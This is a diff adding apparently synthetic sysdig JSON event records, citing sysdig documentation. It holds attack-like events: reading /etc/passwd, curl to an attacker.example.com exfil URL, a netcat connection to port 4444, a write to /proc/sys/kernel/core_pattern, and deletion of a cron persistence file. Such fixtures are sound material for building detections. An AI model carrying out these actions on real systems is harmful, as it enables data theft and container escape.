@@ -1,0 +1,8 @@
+# source: https://github.com/draios/sysdig/wiki/Sysdig-User-Guide, https://www.man7.org/linux//man-pages/man8/sysdig.8.html — sysdig --json output
+{"evt.cpu":0,"evt.dir":"<","evt.info":"res=0 tuple=10.0.2.15:57854->10.0.2.3:domain ","evt.num":2253,"evt.outputtime":1486051398854929464,"evt.type":"connect","proc.name":"ping","thread.tid":20380}
+{"evt.cpu":1,"evt.dir":">","evt.info":"fd=3(<f>/etc/passwd) flags=O_RDONLY ","evt.num":3001,"evt.outputtime":1486051399000123456,"evt.type":"openat","proc.name":"cat","thread.tid":20381}
+{"evt.cpu":1,"evt.dir":"<","evt.info":"res=4(<f>/etc/passwd) ","evt.num":3002,"evt.outputtime":1486051399000234567,"evt.type":"openat","proc.name":"cat","thread.tid":20381}
+{"evt.cpu":0,"evt.dir":">","evt.info":"filename=/usr/bin/curl args=https://attacker.example.com/exfil ","evt.num":4500,"evt.outputtime":1486051400111222333,"evt.type":"execve","proc.name":"curl","thread.tid":20400,"container.id":"abc123","container.name":"app"}
+{"evt.cpu":2,"evt.dir":"<","evt.info":"res=0 fd=5(<4t>10.244.0.5:51234->1.2.3.4:4444) ","evt.num":5500,"evt.outputtime":1486051401222333444,"evt.type":"connect","proc.name":"nc","thread.tid":20401,"container.id":"abc123"}
+{"evt.cpu":3,"evt.dir":">","evt.info":"path=/proc/sys/kernel/core_pattern flags=O_WRONLY ","evt.num":6500,"evt.outputtime":1486051402333444555,"evt.type":"open","proc.name":"sh","thread.tid":20402}
+{"evt.cpu":3,"evt.dir":">","evt.info":"name=/etc/cron.d/persistent ","evt.num":7500,"evt.outputtime":1486051403444555666,"evt.type":"unlinkat","proc.name":"rm","thread.tid":20403}
